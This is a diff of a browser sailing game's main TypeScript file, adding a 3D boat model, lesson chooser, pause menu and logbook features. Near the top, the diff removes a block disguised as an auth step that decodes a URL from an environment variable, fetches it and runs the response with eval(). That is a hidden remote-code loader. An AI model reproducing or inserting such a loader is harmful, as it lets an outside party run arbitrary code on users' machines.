@@ -1,4 +1,5 @@
 import "./style.css";
+import { GLTFLoader } from "three/examples/jsm/loaders/GLTFLoader.js";
 import {
   GameAudio,
   type MusicPlaybackState,
@@ -15,16 +16,19 @@ import {
 } from "./game/hazards";
 import { GameInput } from "./game/input";
 import {
+  castOffRequested,
   dockingPoint,
   evaluateDocking,
   mooredBoatState,
+  retainDockDeparture,
 } from "./game/docking";
 import {
   compassTicks,
   normalizeHeading,
   unwrapCompassHeading,
 } from "./game/compass-tape";
-import { SailingAcademy } from "./game/academy";
+import { SailingAcademy, LESSON_TITLES } from "./game/academy";
+import { createLessonState, createLessonWeather, observeLesson, checkpointLesson, restoreLesson } from "./game/lesson-session";
 import {
   ActivitySession,
   type ActivityView,
@@ -36,6 +40,8 @@ import {
   createProgress,
   parseProgress,
   recordActivityCompletion,
+  recordAcademyObjective,
+  nextLessonObjective,
   type SailingProgress,
 } from "./game/progress";
 import { timeScaleForHold } from "./game/time-scale";
@@ -45,9 +51,11 @@ import {
   type WorldActivity,
   type WorldObject,
 } from "./game/world-definition";
-import { LANDMARKS, SailingWorld } from "./render/world";
+import { depthAtTide } from "./game/bathymetry";
+import { SailingWorld } from "./render/world";
 import { classifyEncounter } from "./render/traffic-navigation";
 import { bindTabList, trapFocusWithin, type TabListController } from "./ui/primitives";
+import { loadBooleanPreference, saveBooleanPreference } from "./ui/preferences";
 import {
   HARBOR_20,
   getBoatDefinition,
@@ -65,7 +73,9 @@ import {
   sailDeploymentTarget,
   sheetForBoomAngle,
   stepBoat,
+  advanceBoatWavePose,
   type BoatState,
+  type Controls,
   type SailDiagnostics,
 } from "./sim/model";
 import {
@@ -77,21 +87,6 @@ import {
   type WeatherSnapshot,
 } from "./weather/types";
 import { WeatherSystem } from "./weather/weather";
-import { weatherTrend } from "./weather/forecast";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 const canvas = required<HTMLCanvasElement>("#lake");
 const elements = {
@@ -126,16 +121,34 @@ const elements = {
   encounterPanel: required("#encounter-panel"),
   encounterAdvisory: required("#encounter-advisory"),
   status: required("#status"),
+  statusToggle: required<HTMLButtonElement>("#status-toggle"),
+  statusDetails: required("#status-details"),
+  statusCue: required("#status-cue"),
+  statusMessage: required("#status-message"),
   welcome: required("#welcome"),
   setSail: required<HTMLButtonElement>("#set-sail"),
   newJourney: required<HTMLButtonElement>("#new-journey"),
   titleSettings: required<HTMLButtonElement>("#title-settings"),
   titleMute: required<HTMLButtonElement>("#title-mute"),
+  titleFreeSail: required<HTMLButtonElement>("#title-free-sail"),
+  continueLesson: required<HTMLButtonElement>("#continue-lesson"),
+  titleLogbook: required<HTMLButtonElement>("#title-logbook"),
+  titleLogbookPanel: required("#title-logbook-panel"),
+  lessonChooser: required("#lesson-chooser"),
   mute: required<HTMLButtonElement>("#mute"),
   reset: required<HTMLButtonElement>("#reset"),
   reefSail: required<HTMLButtonElement>("#reef-sail"),
   toggleSails: required<HTMLButtonElement>("#toggle-sails"),
+  sailActions: required<HTMLDetailsElement>("#sail-actions"),
   conditionsToggle: required<HTMLButtonElement>("#conditions-toggle"),
+  pauseToggle: required<HTMLButtonElement>("#pause-toggle"),
+  pauseScreen: required("#pause-screen"),
+  pausePanel: required("#pause-panel"),
+  pauseMenu: required("#pause-menu"),
+  pauseResume: required<HTMLButtonElement>("#pause-resume"),
+  pauseSettings: required<HTMLButtonElement>("#pause-settings"),
+  pauseLogbook: required<HTMLButtonElement>("#pause-logbook"),
+  pauseLogbookView: required("#pause-logbook-view"),
   mapToggle: required<HTMLButtonElement>("#map-toggle"),
   chartPanel: required("#chart-panel"),
   chartBackdrop: required("#chart-backdrop"),
@@ -149,13 +162,10 @@ const elements = {
   settingsResume: required<HTMLButtonElement>("#settings-resume"),
   settingsMainMenu: required<HTMLButtonElement>("#settings-main-menu"),
   settingsResetBoat: required<HTMLButtonElement>("#settings-reset-boat"),
-  touchControlsEnabled: required<HTMLInputElement>("#touch-controls-enabled"),
   highContrastEnabled: required<HTMLInputElement>("#high-contrast-enabled"),
   settingsResetLogbook: required<HTMLButtonElement>("#settings-reset-logbook"),
   settingsLogbookSummary: required("#settings-logbook-summary"),
   logbookSummary: required("#logbook-summary"),
-  forecastSummary: required("#forecast-summary"),
-  forecastAdvice: required("#forecast-advice"),
   boatSelect: required<HTMLSelectElement>("#boat-select"),
   musicTrackName: required("#music-track-name"),
   musicPlaybackStatus: required("#music-playback-status"),
@@ -171,19 +181,37 @@ const elements = {
   fatal: required("#fatal-error"),
 };
 
+const STORAGE_WARNING = "Browser storage is unavailable. Progress may not survive reload.";
+let storageUnavailable = false;
 let activeBoat: BoatDefinition = loadBoatDefinition();
 let world: SailingWorld;
 let bootComplete = false;
 try {
-  world = new SailingWorld(canvas);
+  const boatAsset = await new GLTFLoader().loadAsync("/models/fair-winds-boat-v2.glb");
+  world = new SailingWorld(canvas, boatAsset.scene);
   world.setBoat(activeBoat);
 } catch (error) {
   elements.fatal.hidden = false;
-  elements.fatal.textContent = "Fair Winds needs WebGL to draw the lake. Try an up-to-date browser with hardware acceleration enabled.";
-  finishBoot();
+  elements.fatal.textContent = "Fair Winds could not load the lake and boat. Check your connection and reload; your browser also needs WebGL enabled.";
+  finishBoot("failed");
   throw error;
 }
-const input = new GameInput();
+const input = new GameInput(document, canControlBoat);
+for (const button of [elements.reefSail, elements.toggleSails]) button.addEventListener("click", () => {
+  elements.sailActions.open = false;
+  elements.sailActions.querySelector("summary")?.focus();
+});
+elements.sailActions.addEventListener("keydown", event => {
+  if (event.key === "Escape" && elements.sailActions.open) {
+    event.preventDefault();
+    event.stopPropagation();
+    elements.sailActions.open = false;
+    elements.sailActions.querySelector("summary")?.focus();
+  }
+});
+document.addEventListener("pointerdown", event => {
+  if (event.target instanceof Node && !elements.sailActions.contains(event.target)) elements.sailActions.open = false;
+});
 const chart = new LakeChart(elements.chartCanvas);
 const miniChart = new LakeChart(elements.minimap);
 const academy = new SailingAcademy();
@@ -206,6 +234,10 @@ let headsailDiagnostics = computeHeadsailAerodynamics(state, {
 let previousFrame = performance.now();
 let accumulator = 0;
 let started = false;
+let paused = false;
+let pauseOpener: HTMLElement = elements.conditionsToggle;
+let titleExitTimeout: number | undefined;
+let lessonChooserOpener: HTMLButtonElement = elements.setSail;
 let lastFlow = "";
 let lastManeuverCount = 0;
 let lessonCompletedAt = 0;
@@ -213,18 +245,23 @@ let incident: IncidentResult | undefined;
 let incidentElapsed = 0;
 let touchCooldown = 0;
 let dockedAt: WorldObject | undefined;
+let departingDock: WorldObject | undefined;
+let dockedControls: Controls = { rudder: 0, sheetRate: 0 };
 let progress: SailingProgress = parseProgress(
-  localStorage.getItem(PROGRESS_STORAGE_KEY),
+  loadStoredValue(PROGRESS_STORAGE_KEY),
 );
 let activitySession: ActivitySession | undefined;
 let activityView: ActivityView | undefined;
 let progressDistanceSinceSave = 0;
 let voyageCounted = false;
-if (progress.academyCompleted) academy.skip();
+restoreLesson(academy, progress);
 let presentationTime = 0;
 let hudUpdateElapsed = 0;
 let compassHeading = radiansToDegrees(state.heading);
-const compassPixelsPerDegree = 2;
+let compassPixelsPerDegree = 3.1;
+let steeringHintOffered = loadBooleanPreference("fair-winds-swipe-hint-seen", false);
+let steeringHintSeconds = 0;
+canvas.addEventListener("pointerdown", () => { steeringHintSeconds = 0; });
 let developmentPreviewFrozen = false;
 let titleAudioPromise: Promise<void> | undefined;
 let settingsTabs: TabListController;
@@ -243,6 +280,7 @@ let titleHeadsailDiagnostics = computeHeadsailAerodynamics(titleState, {
 
 buildCompassTape();
 bindInterface();
+syncTitleState();
 world.resize();
 syncWeatherControls();
 syncAudioControls();
@@ -283,9 +321,9 @@ function createGameState(
 
 function createTitleState(): BoatState {
   const title = createGameState({
-    x: 610,
-    z: 790,
-    heading: degrees(192),
+    x: 1_020,
+    z: -350,
+    heading: degrees(150),
   });
   title.sheet = 0.58;
   title.boomAngle = -degrees(46);
@@ -299,7 +337,7 @@ function createTitleWeatherConfig(): WeatherConfig {
     ...cloneWeatherConfig(DEFAULT_WEATHER),
     mode: "manual",
     timeScale: 1,
-    timeOfDay: 9.4,
+    timeOfDay: 14.7,
     wind: {
       ...DEFAULT_WEATHER.wind,
       speed: 4.4,
@@ -321,12 +359,43 @@ function createTitleWeatherConfig(): WeatherConfig {
 }
 
 function bindInterface(): void {
+  elements.statusToggle.addEventListener("click", () => setStatusOpen(Boolean(elements.statusDetails.hidden)));
+  required(".sailing-status").addEventListener("keydown", (event) => {
+    if (event.code === "Space" || event.code === "Enter") event.stopPropagation();
+  });
+  required("#status-close").addEventListener("click", () => setStatusOpen(false));
+  const lessonDetail = required<HTMLDetailsElement>(".lesson-detail");
+  lessonDetail.addEventListener("toggle", () => {
+    if (lessonDetail.open) lessonDetail.scrollIntoView({ block: "end", behavior: "smooth" });
+  });
   window.addEventListener("pagehide", persistProgress);
+  window.addEventListener("blur", interruptLessonAttempt);
+  document.addEventListener("visibilitychange", interruptLessonAttempt);
   window.addEventListener("resize", () => {
     world.resize();
+    buildCompassTape();
     if (isChartOpen()) renderChart();
   });
   window.addEventListener("keydown", (event) => {
+    if (paused && !isConditionsOpen()) {
+      if (event.code === "Escape" && !event.repeat) {
+        event.preventDefault();
+        if (!elements.pauseLogbookView.hidden) showPauseMenu(elements.pauseLogbook);
+        else setPauseOpen(false);
+      } else if (event.code === "Tab") trapFocusWithin(elements.pausePanel, event);
+      return;
+    }
+    if (event.code === "Escape" && !elements.statusDetails.hidden) {
+      event.preventDefault();
+      setStatusOpen(false);
+      return;
+    }
+    const titleDialog = !elements.lessonChooser.hidden ? elements.lessonChooser : !elements.titleLogbookPanel.hidden ? elements.titleLogbookPanel : undefined;
+    if (!started && titleDialog) {
+      if (event.code === "Escape") { event.preventDefault(); closeTitleDialog(); }
+      else if (event.code === "Tab") trapFocusWithin(titleDialog, event);
+      return;
+    }
     if (event.code === "Escape" && isChartOpen()) {
       event.preventDefault();
       setChartOpen(false);
@@ -343,6 +412,11 @@ function bindInterface(): void {
     }
     if (event.code === "Tab" && isConditionsOpen()) {
       trapFocusWithin(elements.conditionsPanel, event);
+      return;
+    }
+    if (event.code === "Escape" && !event.repeat && started) {
+      event.preventDefault();
+      setPauseOpen(true);
       return;
     }
     if (!event.repeat && event.code === "KeyN" && started) {
@@ -366,10 +440,53 @@ function bindInterface(): void {
     item.addEventListener("pointerenter", () => selectTitleItem(item));
   });
   elements.setSail.addEventListener("click", () => {
-    void beginSailing(false);
+    openLessonChooser(elements.setSail);
   });
   elements.newJourney.addEventListener("click", () => {
-    void beginSailing(true);
+    openLessonChooser(elements.newJourney);
+  });
+  elements.continueLesson.addEventListener("click", () => {
+    if (academy.view().objective === 3) { openLessonChooser(elements.continueLesson); return; }
+    beginSailing(false);
+    activitySession = undefined;
+    activityView = undefined;
+    academy.resume(state);
+    prepareLessonAttempt();
+  });
+  elements.titleFreeSail.addEventListener("click", () => {
+    beginSailing(false);
+    activitySession = undefined;
+    activityView = undefined;
+    academy.skip();
+    interruptLessonAttempt();
+    weatherConfig = loadWeatherConfig();
+    weatherSystem.setConfig(weatherConfig);
+    weather = weatherSystem.sample(simulationTime);
+    persistProgress();
+    updateHud();
+  });
+  const lessonChoices = [...document.querySelectorAll<HTMLButtonElement>("[data-lesson]")];
+  lessonChoices.forEach((button) => button.addEventListener("click", () => {
+    lessonChoices.forEach((choice) => {
+      choice.classList.toggle("is-selected", choice === button);
+      choice.setAttribute("aria-pressed", String(choice === button));
+    });
+    syncLessonTargets();
+  }));
+  required("#start-lesson").addEventListener("click", () => {
+    const lesson = Number(required<HTMLButtonElement>("[data-lesson].is-selected").dataset.lesson);
+    closeTitleDialog(false);
+    beginSailing(false);
+    academy.restoreObjective(nextLessonObjective(progress, lesson));
+    prepareLessonAttempt();
+  });
+  required("#lesson-chooser-close").addEventListener("click", () => closeTitleDialog());
+  required("#title-logbook-close").addEventListener("click", () => closeTitleDialog());
+  elements.titleLogbook.addEventListener("click", () => {
+    fillLogbook(required("#title-logbook-stats"), required("#title-logbook-lessons"));
+    elements.titleLogbookPanel.hidden = false;
+    required(".welcome-lockup").hidden = true;
+    required("#title-logbook-close").focus();
   });
   elements.titleSettings.addEventListener("click", () => {
     void startTitleAudio();
@@ -385,7 +502,17 @@ function bindInterface(): void {
     if (activitySession) {
       setChartOpen(true);
     } else {
-      academy.skip();
+      if (academy.view().objective === 3 || academy.view().stage === "complete") {
+        returnToTitle();
+        openLessonChooser();
+      } else if (academy.view().stage === "free-sail") {
+        academy.resume(state);
+        prepareLessonAttempt();
+      } else {
+        academy.skip();
+        interruptLessonAttempt();
+      }
+      persistProgress();
       lessonCompletedAt = simulationTime;
       updateLesson();
     }
@@ -394,47 +521,48 @@ function bindInterface(): void {
   elements.chartClose.addEventListener("click", () => setChartOpen(false));
   elements.chartBackdrop.addEventListener("click", () => setChartOpen(false));
   elements.conditionsToggle.addEventListener("click", () => setConditionsOpen(!isConditionsOpen()));
+  elements.pauseToggle.addEventListener("click", () => setPauseOpen(true));
+  elements.pauseResume.addEventListener("click", () => setPauseOpen(false));
+  elements.pauseSettings.addEventListener("click", () => {
+    elements.pauseScreen.hidden = true;
+    setConditionsOpen(true);
+  });
+  elements.pauseLogbook.addEventListener("click", () => {
+    fillLogbook(required("#pause-logbook-stats"), required("#pause-logbook-lessons"));
+    elements.pauseMenu.hidden = true;
+    elements.pauseLogbookView.hidden = false;
+    required("#pause-heading").textContent = "Logbook";
+    required("#pause-logbook-back").focus();
+  });
+  required("#pause-logbook-back").addEventListener("click", () => showPauseMenu(elements.pauseLogbook));
+  required("#pause-main-menu").addEventListener("click", returnToTitle);
   elements.conditionsClose.addEventListener("click", () => setConditionsOpen(false));
   elements.conditionsBackdrop.addEventListener("click", () => setConditionsOpen(false));
   elements.settingsResume.addEventListener("click", () => setConditionsOpen(false));
   elements.settingsMainMenu.addEventListener("click", returnToTitle);
   elements.settingsResetBoat.addEventListener("click", resetBoat);
-  const storedOnScreenControls = localStorage.getItem(
-    "fair-winds-on-screen-controls",
-  );
-  elements.touchControlsEnabled.checked =
-    storedOnScreenControls === null
-      ? window.matchMedia("(hover: none), (pointer: coarse)").matches
-      : storedOnScreenControls === "true";
-  syncOnScreenControls();
-  elements.touchControlsEnabled.addEventListener("change", () => {
-    localStorage.setItem(
-      "fair-winds-on-screen-controls",
-      String(elements.touchControlsEnabled.checked),
-    );
-    syncOnScreenControls();
-  });
-  const storedHighContrast = localStorage.getItem(
+  elements.highContrastEnabled.checked = loadBooleanPreference(
     "fair-winds-high-contrast",
+    false,
   );
-  elements.highContrastEnabled.checked = storedHighContrast === "true";
   syncHighContrast();
   elements.highContrastEnabled.addEventListener("change", () => {
-    localStorage.setItem(
-      "fair-winds-high-contrast",
-      String(elements.highContrastEnabled.checked),
-    );
     syncHighContrast();
+    if (!saveBooleanPreference(
+      "fair-winds-high-contrast",
+      elements.highContrastEnabled.checked,
+    )) elements.status.textContent = "This setting applies for this session. Browser storage is unavailable.";
   });
   elements.settingsResetLogbook.addEventListener("click", () => {
+    if (!window.confirm("Reset your local logbook? Saved activity records will be cleared.")) return;
     progress = createProgress();
-    persistProgress();
     activitySession = undefined;
     activityView = undefined;
     academy.reset({
       tackCount: state.tackCount,
       gybeCount: state.gybeCount,
     });
+    persistProgress();
     syncChartActivityList();
     updateLesson();
     elements.status.textContent = "Local logbook reset. Academy coaching is ready.";
@@ -448,14 +576,86 @@ function bindInterface(): void {
   });
   bindWeatherControls();
   bindAudioControls();
+  elements.conditionsPanel.addEventListener("input", (event) => {
+    if (event.target instanceof HTMLInputElement && event.target.type === "range") updateRangeFill(event.target);
+  });
 }
 
 function titleMenuItems(): HTMLButtonElement[] {
   return [
+    elements.continueLesson,
     elements.setSail,
     elements.newJourney,
+    elements.titleFreeSail,
+    elements.titleLogbook,
     elements.titleSettings,
-  ];
+  ].filter((item) => !item.hidden);
+}
+
+function syncTitleState(): void {
+  setStatusOpen(false, false);
+  const returning = progress.voyages > 0;
+  const titleConfig = createTitleWeatherConfig();
+  titleConfig.timeOfDay = returning ? 17.4 : 14.7;
+  titleConfig.wind.directionFromDegrees = returning ? 65 : 147;
+  titleWeatherSystem.setConfig(titleConfig);
+  titleWeather = titleWeatherSystem.sample(presentationTime);
+  titleState.position.x = returning ? 991 : 964;
+  titleState.position.y = returning ? -236 : -404;
+  titleState.heading = degrees(returning ? 130 : 105);
+  titleState.boomAngle = degrees(returning ? 25 : -5);
+  titleState.sheet = sheetForBoomAngle(titleState.boomAngle);
+  refreshTitleDiagnostics();
+  elements.welcome.dataset.returning = String(returning);
+  required("#returning-copy").hidden = !returning;
+  elements.setSail.hidden = returning;
+  elements.continueLesson.hidden = !returning;
+  const view = academy.view();
+  const lesson = view.lesson;
+  const choice = required(`[data-lesson="${lesson}"]`);
+  const complete = view.objective === 3 || view.stage === "complete";
+  elements.newJourney.hidden = !returning || complete;
+  required("#returning-lesson").textContent = LESSON_TITLES[lesson]!;
+  required("#returning-target").textContent = complete
+    ? `${progress.academyCompleted ? "Academy" : "Lesson"} complete · All ${progress.academyCompleted ? "nine" : "three"} targets earned`
+    : `Target ${view.objective + 1} of 3 · ${choice.querySelector(".lesson-targets")!.textContent!.split("·")[view.objective]!.trim()}`;
+  elements.continueLesson.firstChild!.textContent = complete ? "Choose lesson" : "Continue lesson";
+  selectTitleItem(returning ? elements.continueLesson : elements.setSail);
+}
+
+function setStatusOpen(open: boolean, restoreFocus = true): void {
+  if (open) input.releaseAll();
+  elements.statusMessage.textContent = elements.status.textContent;
+  elements.statusDetails.hidden = !open;
+  elements.statusToggle.setAttribute("aria-expanded", String(open));
+  if (!open && restoreFocus) elements.statusToggle.focus();
+}
+
+function syncLessonTargets(): void {
+  const targets = required("[data-lesson].is-selected .lesson-targets").textContent!.split("·");
+  const list = required("#chosen-lesson-targets");
+  list.replaceChildren(...targets.map((target) => {
+    const row = document.createElement("li");
+    row.textContent = target.trim();
+    return row;
+  }));
+}
+
+function openLessonChooser(opener: HTMLButtonElement = elements.continueLesson): void {
+  lessonChooserOpener = opener;
+  void startTitleAudio();
+  elements.lessonChooser.hidden = false;
+  required(".welcome-lockup").hidden = true;
+  syncLessonTargets();
+  required("[data-lesson].is-selected").focus();
+}
+
+function closeTitleDialog(restoreFocus = true): void {
+  const logbook = !elements.titleLogbookPanel.hidden;
+  elements.lessonChooser.hidden = true;
+  elements.titleLogbookPanel.hidden = true;
+  required(".welcome-lockup").hidden = false;
+  if (restoreFocus) (logbook ? elements.titleLogbook : lessonChooserOpener).focus();
 }
 
 function selectTitleItem(selected: HTMLButtonElement): void {
@@ -478,21 +678,24 @@ function moveTitleSelection(direction: -1 | 1): void {
 
 async function startTitleAudio(): Promise<void> {
   if (titleAudioPromise) return titleAudioPromise;
+  const firstStart = !audio.isStarted;
   titleAudioPromise = (async () => {
     try {
       await audio.start();
-      await audio.selectMusicTrack("fair-winds");
+      if (firstStart) await audio.selectMusicTrack("fair-winds");
       syncAudioControls();
     } catch {
       elements.status.textContent =
         "Audio is unavailable; sailing will continue silently.";
+    } finally {
+      titleAudioPromise = undefined;
     }
   })();
   return titleAudioPromise;
 }
 
-async function beginSailing(newJourney: boolean): Promise<void> {
-  await startTitleAudio();
+function beginSailing(newJourney: boolean): void {
+  void startTitleAudio();
   if (newJourney || !voyageCounted) {
     progress = { ...progress, voyages: progress.voyages + 1 };
     persistProgress();
@@ -505,34 +708,36 @@ async function beginSailing(newJourney: boolean): Promise<void> {
   world.resetCamera();
   elements.gameShell.classList.remove("is-welcome");
   elements.welcome.classList.add("is-leaving");
-  window.setTimeout(() => {
+  window.clearTimeout(titleExitTimeout);
+  titleExitTimeout = window.setTimeout(() => {
     elements.welcome.hidden = true;
   }, 540);
   hudUpdateElapsed = 0;
   updateHud();
-  elements.status.textContent = newJourney
-    ? "New journey. Sheet in gently until the mainsail stops luffing."
-    : "Set sail. Sheet in gently until the mainsail stops luffing.";
+  elements.status.textContent = dockedAt
+    ? `Docked at ${dockedAt.name}. Use the helm or sheets to cast off.`
+    : !state.sailsRaised
+      ? "Sails lowered. Hoist sail to make way."
+      : newJourney
+        ? "New journey. Sheet in gently until the mainsail stops luffing."
+        : `${elements.flow.textContent}. ${elements.coach.textContent}.`;
 }
 
 function returnToTitle(): void {
+  setPauseOpen(false, false);
+  interruptLessonAttempt();
+  persistProgress();
+  window.clearTimeout(titleExitTimeout);
   setConditionsOpen(false);
   setChartOpen(false);
   started = false;
   elements.welcome.hidden = false;
   elements.welcome.classList.remove("is-leaving");
   elements.gameShell.classList.add("is-welcome");
-  selectTitleItem(elements.setSail);
-  elements.setSail.focus({ preventScroll: true });
+  syncTitleState();
+  elements.continueLesson.focus({ preventScroll: true });
   audio.resetMotionState();
   elements.status.textContent = "Main menu. Your journey is ready to continue.";
-}
-
-function syncOnScreenControls(): void {
-  elements.gameShell.classList.toggle(
-    "show-on-screen-controls",
-    elements.touchControlsEnabled.checked,
-  );
 }
 
 function syncHighContrast(): void {
@@ -546,7 +751,7 @@ function resetJourney(): void {
   simulationTime = 0;
   weatherConfig = cloneWeatherConfig(DEFAULT_WEATHER);
   activeBoat = HARBOR_20;
-  localStorage.setItem("fair-winds-boat", activeBoat.id);
+  saveStoredValue("fair-winds-boat", activeBoat.id);
   world.setBoat(activeBoat);
   refreshTitleDiagnostics();
   applyWeatherConfig(true);
@@ -600,7 +805,9 @@ function enableDevelopmentPreview(): void {
   const previewBoat = parameters.get("boat");
   if (
     previewBoat === "harbor-20" ||
+    previewBoat === "cove-24" ||
     previewBoat === "coastal-28" ||
+    previewBoat === "sound-30" ||
     previewBoat === "lake-34"
   ) {
     activeBoat = getBoatDefinition(previewBoat);
@@ -720,12 +927,29 @@ function enableDevelopmentPreview(): void {
 }
 
 function loop(now: number): void {
-  const frameDt = Math.min(Math.max((now - previousFrame) / 1_000, 0), 0.1);
+  const elapsed = Math.max((now - previousFrame) / 1_000, 0);
+  const droppedFrame = elapsed > fixedStep * 5;
+  const frameDt = Math.min(elapsed, 0.1);
   previousFrame = now;
-  presentationTime += frameDt;
+  const portrait = window.matchMedia("(orientation: portrait)").matches;
+  elements.gameShell.inert = portrait;
+  if (portrait || document.hidden) interruptLessonAttempt();
+  if (droppedFrame) {
+    academy.interrupt();
+    accumulator = 0;
+  }
+  if (!portrait) presentationTime += frameDt;
   if (input.consumeMute()) toggleMute();
   if (input.consumeConditions()) setConditionsOpen(!isConditionsOpen());
-  const simulationPaused = isSimulationPaused();
+  const simulationPaused = document.hidden || portrait || isSimulationPaused();
+  if (simulationPaused) { academy.interrupt(); input.releaseAll(); }
+  if (canControlBoat() && !steeringHintOffered && window.matchMedia("(pointer: coarse)").matches) {
+    steeringHintOffered = true;
+    steeringHintSeconds = 5;
+    saveBooleanPreference("fair-winds-swipe-hint-seen", true);
+  }
+  if (!simulationPaused) steeringHintSeconds = Math.max(0, steeringHintSeconds - frameDt);
+  required("#steering-hint").hidden = steeringHintSeconds <= 0 || !canControlBoat();
   const simulationTimeScale = timeScaleForHold(input.isFastForwarding());
   elements.gameShell.dataset.timeScale = `${simulationTimeScale}`;
   if (!simulationPaused && input.consumeReset()) resetBoat();
@@ -746,14 +970,19 @@ function loop(now: number): void {
       touchCooldown = Math.max(0, touchCooldown - fixedStep);
       if (incident) {
         incidentElapsed += fixedStep;
+        if (incident.kind === "grounding") {
+          state = {
+            ...state,
+            ...advanceBoatWavePose(state, sampleBoatWavePose(state, weather.waves, weather.time, activeBoat), activeBoat, fixedStep),
+          };
+        }
       } else {
         const controls = isConditionsOpen()
           ? { rudder: 0, sheetRate: 0 }
-          : input.read();
+          : input.read(state.sheet);
         if (dockedAt) {
-          const castingOff =
-            Math.abs(controls.rudder) > 0.01 ||
-            Math.abs(controls.sheetRate) > 0.01;
+          const castingOff = castOffRequested(controls, dockedControls);
+          dockedControls = controls;
           if (!castingOff) {
             state = {
               ...state,
@@ -772,7 +1001,9 @@ function loop(now: number): void {
             accumulator -= fixedStep;
             continue;
           }
+          const departure = dockedAt;
           clearDocking();
+          departingDock = departure;
           elements.status.textContent =
             "Casting off from Juniper Harbor. Steer clear of the finger pier.";
         }
@@ -792,21 +1023,27 @@ function loop(now: number): void {
           },
           fixedStep,
         );
+        departingDock = retainDockDeparture(result.state, departingDock);
         const nextIncident = evaluateIncident(
           result.state,
           activeBoat,
           FAIR_WINDS_WORLD,
           weather.tideLevel,
+          departingDock,
+          state,
         );
         if (nextIncident.kind === "docking") {
           const docking = evaluateDocking(
             result.state,
             activeBoat,
             FAIR_WINDS_WORLD,
+            departingDock,
           );
           if (docking) {
             state = mooredBoatState(result.state, docking);
             dockedAt = docking.object;
+            departingDock = undefined;
+            dockedControls = controls;
             elements.gameShell.dataset.dockedAt = docking.object.id;
             elements.status.textContent =
               "Docked at Juniper Harbor. Use the helm or sheets when you are ready to cast off.";
@@ -831,6 +1068,7 @@ function loop(now: number): void {
         ) {
           state = {
             ...result.state,
+            ...nextIncident.contactPose,
             velocity: { x: 0, y: 0 },
             yawRate: 0,
             rudderAngle: 0,
@@ -856,26 +1094,25 @@ function loop(now: number): void {
             persistProgress();
           }
         }
-        if (
-          !incident &&
-          nextIncident.kind !== "docking" &&
-          !activitySession &&
-          academy.update(fixedStep, academyObservation())
-        ) {
-          const view = academy.view();
-          elements.status.textContent = `${view.title}. ${view.instruction}`;
-          if (view.stage === "complete") {
-            lessonCompletedAt = simulationTime;
-            if (!progress.academyCompleted) {
-              progress = { ...progress, academyCompleted: true };
-              persistProgress();
-            }
+        const eligible = !droppedFrame && !incident && nextIncident.kind !== "docking"
+          && nextIncident.severity !== "touch" && !activitySession && !dockedAt;
+        if (!eligible) academy.interrupt();
+        else {
+          const earnedObjective = academy.objectiveIndex();
+          if (academy.update(fixedStep / simulationTimeScale, observeLesson(state, diagnostics, controls))) {
+            progress = recordAcademyObjective(progress, earnedObjective);
+            persistProgress();
+            const view = academy.view();
+            elements.status.textContent = view.stage === "lesson-complete"
+              ? `${view.title} complete. All three targets earned.`
+              : `${view.title}. ${view.instruction}`;
+            if (view.stage === "lesson-complete") lessonCompletedAt = simulationTime;
           }
         }
         updateActivitySession(fixedStep);
       }
     }
-    accumulator -= fixedStep;
+    accumulator = Math.max(0, accumulator - fixedStep);
   }
 
   let renderPrevious = previousState;
@@ -911,9 +1148,9 @@ function loop(now: number): void {
     renderHeadsail,
     renderWeather,
     accumulator / fixedStep,
-    frameDt,
+    simulationPaused ? 0 : frameDt,
     incident ? { result: incident, elapsed: incidentElapsed } : undefined,
-    !started,
+    started ? undefined : progress.voyages > 0 ? "return" : "arrival",
     presentationTime,
   );
   if (started) updateCompass(renderCurrent.heading);
@@ -935,16 +1172,21 @@ function loop(now: number): void {
   requestAnimationFrame(loop);
 }
 
-function finishBoot(): void {
+function finishBoot(status: "ready" | "failed" = "ready"): void {
   if (bootComplete) return;
   bootComplete = true;
-  document.documentElement.dataset.appReady = "true";
+  document.documentElement.dataset.appReady = String(status === "ready");
   window.setTimeout(() => {
     document.querySelector("#boot-loader")?.remove();
   }, 260);
 }
 
 function resetBoat(): void {
+  interruptLessonAttempt();
+  if (started && !activitySession && !["free-sail", "lesson-complete", "complete"].includes(academy.view().stage)) {
+    prepareLessonAttempt();
+    return;
+  }
   state = createGameState();
   previousState = state;
   diagnostics = computeSailAerodynamics(state, {
@@ -955,10 +1197,6 @@ function resetBoat(): void {
     trueWind: weather.trueWind,
     boat: activeBoat,
   });
-  academy.reset({
-    tackCount: state.tackCount,
-    gybeCount: state.gybeCount,
-  });
   activitySession = undefined;
   activityView = undefined;
   audio.resetMotionState();
@@ -967,6 +1205,7 @@ function resetBoat(): void {
   clearDocking();
   clearIncident();
   world.resetWake();
+  world.resetCamera();
   elements.status.textContent = "Boat reset. Sheet in gently to attach flow.";
 }
 
@@ -974,7 +1213,7 @@ function selectBoat(id: BoatId): void {
   const nextBoat = getBoatDefinition(id);
   if (!nextBoat) return;
   activeBoat = nextBoat;
-  localStorage.setItem("fair-winds-boat", activeBoat.id);
+  saveStoredValue("fair-winds-boat", activeBoat.id);
   world.setBoat(activeBoat);
   refreshTitleDiagnostics();
   resetBoat();
@@ -984,6 +1223,7 @@ function selectBoat(id: BoatId): void {
 }
 
 function recoverBoat(): void {
+  interruptLessonAttempt();
   state = createGameState(FAIR_WINDS_WORLD.recoverySpawn);
   previousState = state;
   diagnostics = computeSailAerodynamics(state, {
@@ -995,9 +1235,11 @@ function recoverBoat(): void {
     boat: activeBoat,
   });
   academy.skip();
+  persistProgress();
   audio.resetMotionState();
   lessonCompletedAt = simulationTime;
   lastManeuverCount = 0;
+  clearDocking();
   clearIncident();
   world.resetWake();
   elements.status.textContent =
@@ -1005,6 +1247,7 @@ function recoverBoat(): void {
 }
 
 function beginIncident(result: IncidentResult): void {
+  interruptLessonAttempt();
   incident = result;
   incidentElapsed = 0;
   elements.gameShell.classList.add("has-incident");
@@ -1036,6 +1279,8 @@ function clearIncident(): void {
 
 function clearDocking(): void {
   dockedAt = undefined;
+  departingDock = undefined;
+  dockedControls = { rudder: 0, sheetRate: 0 };
   delete elements.gameShell.dataset.dockedAt;
 }
 
@@ -1141,14 +1386,19 @@ function updateHud(): void {
   elements.flow.textContent = flow;
   elements.flow.dataset.state = flow.toLowerCase();
   elements.coach.textContent = coach;
-  elements.marker.style.left = `${state.sheet * 100}%`;
